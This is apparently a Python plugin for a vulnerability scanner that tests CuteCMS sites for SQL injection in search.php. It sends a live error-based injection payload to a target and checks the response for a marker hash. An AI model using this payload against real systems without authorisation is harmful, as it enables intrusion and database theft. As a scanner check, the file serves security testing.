#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urllib.parse
import requests
import ClassCongregation

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number'] = "0"  # 平台漏洞编号，留空
        self.info['author'] = "KpLi0rn"  # 插件作者
        self.info['createDate'] = "2020-1-19"  # 插件编辑时间
        self.info['disclosure'] = '2014-01-15'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "CuteCMSSQLinjection"  # 插件名称
        self.info['name'] = 'CuteCMSSQL注入漏洞'  # 漏洞名称
        self.info['affects'] = "CuteCMS"  # 漏洞组件
        self.info['desc_content'] = "CuteCMS是基于PHP+MYSQL的网站内容管理系统,search.php参数未过滤导致SQL注入"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = '/search.php?c=5&hit=1&s=%27and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20concat%28md5(c)%29%20from%20tcylnet_user%20limit%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29and%27'

        payload_url = scheme + "//" + url + ":" + str(port) + payload
        headers = {
            'User-Agent': RandomAgent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }

        s = requests.session()
        resp = s.get(payload_url,headers=headers, timeout=6, verify=False)
        con = resp.text
        if con.find("4a8a08f09d37b73795649038408b5f33") != -1:
            Medusa = "{}存在CuteCMSSQL注入漏洞\r\n 验证数据:\r\nUrl:{}\r\nPayload:{}\r\n".format(url,payload_url,con)
            _t = VulnerabilityInfo(Medusa)
            web = ClassCongregation.VulnerabilityDetails(_t.info)
            web.High()
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类传入URL和错误插件名


